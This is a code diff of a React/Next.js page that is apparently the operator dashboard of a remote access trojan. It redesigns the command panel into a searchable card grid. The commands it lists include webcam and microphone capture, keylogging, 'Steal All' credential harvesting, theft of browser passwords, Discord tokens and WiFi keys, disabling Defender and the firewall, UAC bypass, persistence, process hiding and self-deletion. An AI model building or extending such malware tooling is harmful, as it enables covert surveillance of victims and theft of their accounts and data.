@@ -9,90 +9,6 @@ import dynamic from "next/dynamic"
 
 const MapComponent = dynamic(() => import("./MapView"), { ssr: false })
 
-const COMMAND_CATEGORIES = [
-  {
-    title: "Core", icon: "⚙️", commands: [
-      { label: "System Info", cmd: "!sysinfo" },
-      { label: "Public IP", cmd: "!publicip" },
-      { label: "Admin Check", cmd: "!admincheck" },
-      { label: "Voice", cmd: '!voice "Hello from admin"' },
-      { label: "Help", cmd: "!help" },
-    ]
-  },
-  {
-    title: "System", icon: "💻", commands: [
-      { label: "Shutdown", cmd: "!shutdown" },
-      { label: "Restart", cmd: "!restart" },
-      { label: "Logoff", cmd: "!logoff" },
-      { label: "Block Input", cmd: "!block" },
-      { label: "Unblock Input", cmd: "!unblock" },
-      { label: "Task Manager OFF", cmd: "!disabletaskmgr" },
-      { label: "Task Manager ON", cmd: "!enabletaskmgr" },
-      { label: "Kill Process", cmd: "!prockill " },
-      { label: "List Processes", cmd: "!listprocess" },
-      { label: "Blue Screen", cmd: "!bluescreen" },
-      { label: "Beep", cmd: "!beep" },
-    ]
-  },
-  {
-    title: "Surveillance", icon: "👁️", commands: [
-      { label: "Screenshot", cmd: "!screenshot" },
-      { label: "Webcam Pic", cmd: "!webcampic" },
-      { label: "Clipboard", cmd: "!clipboard" },
-      { label: "Idle Time", cmd: "!idletime" },
-      { label: "Keylog Start", cmd: "!keylog" },
-      { label: "Microphone", cmd: "!mic" },
-    ]
-  },
-  {
-    title: "Files", icon: "📁", commands: [
-      { label: "Current Dir", cmd: "!currentdir" },
-      { label: "Change Dir", cmd: "!cd " },
-      { label: "Upload File", cmd: "!upload " },
-      { label: "Download File", cmd: "!download " },
-      { label: "Delete File", cmd: "!delete " },
-      { label: "Execute", cmd: "!execute " },
-      { label: "Write File", cmd: "!write " },
-    ]
-  },
-  {
-    title: "Network", icon: "🌐", commands: [
-      { label: "IP Info", cmd: "!ipinfo" },
-      { label: "Geolocate", cmd: "!geolocate" },
-      { label: "WiFi Passwords", cmd: "!wifi" },
-    ]
-  },
-  {
-    title: "Security", icon: "🔒", commands: [
-      { label: "Disable Defender", cmd: "!disabledefender" },
-      { label: "Disable Firewall", cmd: "!disablefirewall" },
-      { label: "Grab Tokens", cmd: "!grabtokens" },
-      { label: "Discord Info", cmd: "!discordinfo" },
-      { label: "Browser Passwords", cmd: "!browserpasswords" },
-      { label: "UAC Bypass", cmd: "!uacbypass" },
-    ]
-  },
-  {
-    title: "Persistence", icon: "🔄", commands: [
-      { label: "Add to Startup", cmd: "!startup" },
-      { label: "Critical Process", cmd: "!critproc" },
-      { label: "Uncritical", cmd: "!uncritproc" },
-    ]
-  },
-  {
-    title: "Other", icon: "✨", commands: [
-      { label: "Wallpaper", cmd: "!wallpaper " },
-      { label: "Audio", cmd: "!audio " },
-      { label: "Kill Switch", cmd: "!killswitch" },
-      { label: "Exit Client", cmd: "!exit" },
-    ]
-  },
-]
-
-function formatDate(dateStr: string): string {
-  return new Date(dateStr).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", second: "2-digit" })
-}
-
 export default function ClientDetailPage() {
   const params = useParams()
   const router = useRouter()
@@ -103,7 +19,10 @@ export default function ClientDetailPage() {
   const [commandHistory, setCommandHistory] = useState<any[]>([])
   const [sending, setSending] = useState(false)
   const terminalRef = useRef<HTMLDivElement>(null)
-  const [collapsed, setCollapsed] = useState<Record<string, boolean>>({})
+
+  function formatDate(dateStr: string): string {
+    return new Date(dateStr).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", second: "2-digit" })
+  }
 
   // Screen stream
   const [screenshot, setScreenshot] = useState<string | null>(null)
@@ -245,10 +164,6 @@ export default function ClientDetailPage() {
     } finally {
       setSending(false)
     }
-  }
-
-  function toggleCategory(title: string) {
-    setCollapsed(prev => ({ ...prev, [title]: !prev[title] }))
   }
 
   if (loading) {
@@ -464,72 +379,203 @@ export default function ClientDetailPage() {
         </div>
       )}
 
-      {/* COMMANDS TAB */}
+      {/* COMMANDS TAB — Card Grid Layout */}
       {activeTab === "terminal" && (
-        <div className="space-y-4">
-          {/* Quick Command Buttons */}
-          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
-            {COMMAND_CATEGORIES.map(cat => (
-              <div key={cat.title} className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
-                <button
-                  onClick={() => toggleCategory(cat.title)}
-                  className="w-full flex items-center justify-between p-3 text-xs font-semibold text-zinc-300 hover:bg-zinc-800/50 transition-colors"
-                >
-                  <span>{cat.icon} {cat.title}</span>
-                  <svg className={`w-3 h-3 transition-transform ${collapsed[cat.title] ? "" : "rotate-90"}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="9 18 15 12 9 6"/></svg>
-                </button>
-                {!collapsed[cat.title] && (
-                  <div className="p-2 space-y-1">
-                    {cat.commands.map(cmd => (
-                      <button
-                        key={cmd.cmd}
-                        onClick={() => sendCommand(cmd.cmd)}
-                        className="w-full text-left px-2 py-1.5 rounded-lg text-xs text-zinc-400 hover:bg-zinc-800 hover:text-white transition-colors flex items-center justify-between group"
-                      >
-                        <span>{cmd.label}</span>
-                        <span className="text-[10px] text-zinc-600 font-mono opacity-0 group-hover:opacity-100 transition-opacity">{cmd.cmd.substring(0, 15)}</span>
-                      </button>
-                    ))}
-                  </div>
-                )}
-              </div>
-            ))}
+        <div className="space-y-5">
+          {/* Search */}
+          <div className="relative">
+            <svg className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+            <input
+              type="text"
+              value={command}
+              onChange={(e) => setCommand(e.target.value)}
+              placeholder="Search 70+ commands..."
+              className="w-full pl-10 pr-4 py-3 rounded-2xl border border-border/50 bg-card/60 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-primary/50 transition-all"
+            />
           </div>
 
-          {/* Manual Command Input */}
-          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
-            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Manual Command</h3>
-            <form onSubmit={(e) => { e.preventDefault(); sendCommand(command) }} className="flex gap-2">
-              <input
-                type="text"
-                value={command}
-                onChange={(e) => setCommand(e.target.value)}
-                placeholder="Type command (e.g., !sysinfo)..."
-                className="input-premium flex-1 font-mono text-sm"
-              />
-              <Button type="submit" disabled={sending || !command.trim()} loading={sending} size="sm">
-                Send
-              </Button>
-            </form>
-          </div>
+          {/* CATEGORIES */}
+          {[
+            {
+              title: "System Administration", icon: "⚙️", color: "border-l-primary",
+              desc: "Device power, lock, and management", items: [
+                { cmd: "!shutdown", label: "Shutdown", desc: "Power off the remote device", icon: "⏻" },
+                { cmd: "!restart", label: "Restart", desc: "Reboot the remote device", icon: "🔄" },
+                { cmd: "!logoff", label: "Sign Out", desc: "Log off current user session", icon: "🚪" },
+                { cmd: "!lock", label: "Lock Device", desc: "Lock the workstation", icon: "🔒" },
+                { cmd: "!bluescreen", label: "Blue Screen", desc: "Trigger BSOD on remote device", icon: "💀" },
+                { cmd: "!beep", label: "Test Sound", desc: "Play audible beep on device", icon: "🔊" },
+                { cmd: "!elevate", label: "Elevate", desc: "Attempt admin privilege elevation", icon: "⬆️" },
+                { cmd: "!disableuac", label: "Disable UAC", desc: "Turn off User Account Control", icon: "🛡️" },
+              ]
+            },
+            {
+              title: "Input Control", icon: "🖱️", color: "border-l-warning",
+              desc: "Block/unblock input and task manager", items: [
+                { cmd: "!block", label: "Block Input", desc: "Freeze keyboard and mouse", icon: "🧊" },
+                { cmd: "!unblock", label: "Unblock Input", desc: "Restore keyboard and mouse", icon: "♨️" },
+                { cmd: "!disabletaskmgr", label: "Disable Task Mgr", desc: "Prevent Task Manager access", icon: "🚫" },
+                { cmd: "!enabletaskmgr", label: "Enable Task Mgr", desc: "Restore Task Manager access", icon: "✅" },
+              ]
+            },
+            {
+              title: "Surveillance", icon: "👁️", color: "border-l-destructive",
+              desc: "Screen, webcam, keylog, microphone", items: [
+                { cmd: "!screenshot", label: "Screenshot", desc: "Capture remote screen now", icon: "📸" },
+                { cmd: "!webcampic", label: "Webcam Photo", desc: "Snap picture from webcam", icon: "📷" },
+                { cmd: "!keylog", label: "Keylogger", desc: "Start keystroke recording", icon: "⌨️" },
+                { cmd: "!clipboard", label: "Clipboard", desc: "Read clipboard contents", icon: "📋" },
+                { cmd: "!idletime", label: "Idle Time", desc: "Check user idle duration", icon: "💤" },
+                { cmd: "!mic", label: "Microphone", desc: "Capture audio from mic", icon: "🎙️" },
+                { cmd: "!getcams", label: "List Webcams", desc: "Enumerate available cameras", icon: "📹" },
+              ]
+            },
+            {
+              title: "File System", icon: "📁", color: "border-l-green-500",
+              desc: "Browse, download, upload, execute files", items: [
+                { cmd: "!dir", label: "List Files", desc: "List directory contents", icon: "📂" },
+                { cmd: "!currentdir", label: "Current Dir", desc: "Show working directory", icon: "📍" },
+                { cmd: "!download", label: "Download File", desc: "Download file from device", icon: "⬇️" },
+                { cmd: "!upload", label: "Upload File", desc: "Send file to device", icon: "⬆️" },
+                { cmd: "!delete", label: "Delete File", desc: "Remove file from device", icon: "🗑️" },
+                { cmd: "!execute", label: "Execute File", desc: "Run executable on device", icon: "▶️" },
+                { cmd: "!write", label: "Write File", desc: "Create text file on device", icon: "✏️" },
+                { cmd: "!cd", label: "Change Dir", desc: "Navigate to a folder", icon: "📌" },
+              ]
+            },
+            {
+              title: "Process & System", icon: "💻", color: "border-l-blue-500",
+              desc: "Monitor and control processes", items: [
+                { cmd: "!listprocess", label: "List Processes", desc: "Show running processes", icon: "📊" },
+                { cmd: "!prockill", label: "Kill Process", desc: "Terminate a process by name", icon: "❌" },
+                { cmd: "!sysinfo", label: "System Info", desc: "Full system specifications", icon: "🖥️" },
+                { cmd: "!admincheck", label: "Admin Check", desc: "Check if running as admin", icon: "👑" },
+                { cmd: "!publicip", label: "Public IP", desc: "Show device public IP", icon: "🌐" },
+              ]
+            },
+            {
+              title: "Data Collection", icon: "🕵️", color: "border-l-purple-500",
+              desc: "Gather credentials, tokens, and info", items: [
+                { cmd: "!grabtokens", label: "Grab Tokens", desc: "Extract Discord tokens", icon: "🎫" },
+                { cmd: "!steal", label: "Steal All", desc: "Collect all credentials and data", icon: "🕶️" },
+                { cmd: "!wifi", label: "WiFi Passwords", desc: "Extract saved WiFi keys", icon: "📶" },
+                { cmd: "!browserpasswords", label: "Browser Passwords", desc: "Extract saved browser logins", icon: "🔐" },
+                { cmd: "!password", label: "Windows Passwords", desc: "Dump Windows credentials", icon: "🔑" },
+                { cmd: "!discordinfo", label: "Discord Info", desc: "Gather Discord account data", icon: "💬" },
+              ]
+            },
+            {
+              title: "Security", icon: "🛡️", color: "border-l-red-500",
+              desc: "Disable defenses and extract security info", items: [
+                { cmd: "!disabledefender", label: "Disable Defender", desc: "Turn off Windows Defender", icon: "🛑" },
+                { cmd: "!disablefirewall", label: "Disable Firewall", desc: "Turn off Windows Firewall", icon: "🔥" },
+                { cmd: "!uacbypass", label: "UAC Bypass", desc: "Bypass User Account Control", icon: "⚡" },
+              ]
+            },
+            {
+              title: "Network & Geolocation", icon: "🌍", color: "border-l-cyan-500",
+              desc: "IP and network reconnaissance", items: [
+                { cmd: "!ipinfo", label: "IP Info", desc: "Detailed IP intelligence", icon: "🔎" },
+                { cmd: "!geolocate", label: "Geolocate", desc: "Get device GPS coordinates", icon: "📍" },
+                { cmd: "!message", label: "Message Box", desc: "Show popup message on device", icon: "💬" },
+                { cmd: "!voice", label: "Voice Speak", desc: "Text-to-speech on device", icon: "🗣️" },
+              ]
+            },
+            {
+              title: "Apps & Games", icon: "🎮", color: "border-l-yellow-500",
+              desc: "Steam, Telegram, email clients", items: [
+                { cmd: "!steam", label: "Steam Info", desc: "Gather Steam account data", icon: "🎮" },
+                { cmd: "!telegram", label: "Telegram Info", desc: "Find Telegram sessions", icon: "✈️" },
+                { cmd: "!email", label: "Email Clients", desc: "Detect email applications", icon: "📧" },
+              ]
+            },
+            {
+              title: "Persistence", icon: "🔗", color: "border-l-orange-500",
+              desc: "Install or remove persistence", items: [
+                { cmd: "!startup", label: "Add to Startup", desc: "Install registry + folder persistence", icon: "🚀" },
+                { cmd: "!critproc", label: "Critical Process", desc: "Set as critical (BSOD if killed)", icon: "💥" },
+                { cmd: "!uncritproc", label: "Uncritical", desc: "Remove critical process flag", icon: "🔓" },
+                { cmd: "!hide", label: "Hide Process", desc: "Hide window + apply stealth", icon: "👻" },
+                { cmd: "!unhide", label: "Show Process", desc: "Restore visibility", icon: "👁️" },
+              ]
+            },
+            {
+              title: "Termination", icon: "⏹️", color: "border-l-muted-foreground",
+              desc: "Exit, kill, or self-destruct", items: [
+                { cmd: "!exit", label: "Exit Client", desc: "Gracefully close the client", icon: "🛑" },
+                { cmd: "!kill", label: "Kill Client", desc: "Force close immediately", icon: "💀" },
+                { cmd: "!killswitch", label: "Kill Switch", desc: "Self-delete and exit", icon: "🔥" },
+                { cmd: "!help", label: "Help", desc: "Show available commands", icon: "❓" },
+              ]
+            },
+          ].map((cat) => {
+            // Filter by search
+            const filtered = command.trim()
+              ? cat.items.filter(i =>
+                  i.label.toLowerCase().includes(command.toLowerCase()) ||
+                  i.cmd.toLowerCase().includes(command.toLowerCase()) ||
+                  i.desc.toLowerCase().includes(command.toLowerCase())
+                )
+              : cat.items
+            if (filtered.length === 0) return null
+            return (
+              <div key={cat.title} className="rounded-2xl border border-border/50 bg-card/60 overflow-hidden">
+                <div className={`p-4 border-l-4 ${cat.color} bg-muted/20`}>
+                  <div className="flex items-center gap-2">
+                    <span className="text-xl">{cat.icon}</span>
+                    <div>
+                      <h3 className="text-sm font-bold text-foreground">{cat.title}</h3>
+                      <p className="text-[10px] text-muted-foreground">{cat.desc}</p>
+                    </div>
+                    <span className="ml-auto text-[10px] text-muted-foreground">{filtered.length}</span>
+                  </div>
+                </div>
+                <div className="p-3 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2">
+                  {filtered.map((item) => {
+                    const busy = sending && command === item.cmd
+                    return (
+                      <button
+                        key={item.cmd}
+                        onClick={() => sendCommand(item.cmd)}
+                        disabled={sending}
+                        className={`relative text-left p-3 rounded-xl border border-border/40 bg-card/40 hover:bg-muted/30 hover:border-primary/30 hover:scale-[1.02] transition-all duration-200 group ${
+                          busy ? "opacity-70" : ""
+                        }`}
+                      >
+                        {busy ? (
+                          <div className="w-3.5 h-3.5 border-2 border-muted-foreground/30 border-t-primary rounded-full animate-spin absolute top-2 right-2" />
+                        ) : null}
+                        <span className="text-2xl block mb-1.5 group-hover:scale-110 transition-transform inline-block">{item.icon}</span>
+                        <p className="text-[11px] font-semibold text-foreground">{item.label}</p>
+                        <p className="text-[9px] text-muted-foreground mt-0.5 line-clamp-2">{item.desc}</p>
+                        <code className="text-[9px] text-primary/30 font-mono mt-1 block group-hover:text-primary/60 transition-colors">{item.cmd}</code>
+                      </button>
+                    )
+                  })}
+                </div>
+              </div>
+            )
+          })}
 
           {/* Command History */}
-          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
-            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Command History ({commandHistory.length})</h3>
-            <div className="bg-black/80 rounded-lg p-3 font-mono text-xs max-h-60 overflow-y-auto space-y-1">
+          <div className="rounded-2xl border border-border/50 bg-card/60 overflow-hidden">
+            <div className="p-4 border-b border-border/30 flex items-center justify-between">
+              <h3 className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">History ({commandHistory.length})</h3>
+            </div>
+            <div className="bg-black/30 rounded-b-2xl p-4 font-mono text-xs max-h-60 overflow-y-auto space-y-1.5">
               {commandHistory.length === 0 ? (
-                <span className="text-zinc-600">No commands executed yet.</span>
+                <span className="text-muted-foreground/30">No commands sent yet. Click any button above.</span>
               ) : (
-                commandHistory.map((cmd, i) => (
+                commandHistory.map((cmd: any, i: number) => (
                   <div key={i} className="flex items-start gap-2">
                     <span className="text-green-400 shrink-0">$</span>
                     <div className="min-w-0 flex-1">
-                      <span className="text-zinc-200">{cmd.command}</span>
+                      <span className="text-foreground/80">{cmd.command}</span>
                       {cmd.output && (
-                        <pre className="text-zinc-500 text-[10px] mt-0.5 whitespace-pre-wrap break-all">{typeof cmd.output === 'string' ? cmd.output.substring(0, 500) : cmd.output}</pre>
+                        <pre className="text-muted-foreground text-[10px] mt-0.5 whitespace-pre-wrap break-all max-h-16 overflow-y-auto">{typeof cmd.output === 'string' ? cmd.output.substring(0, 300) : ""}</pre>
                       )}
                     </div>
-                    <span className="text-zinc-600 text-[10px] shrink-0">{formatDate(cmd.executedAt)}</span>
+                    <span className="text-muted-foreground/30 text-[10px] shrink-0">{formatDate(cmd.executedAt)}</span>
                   </div>
                 ))
               )}
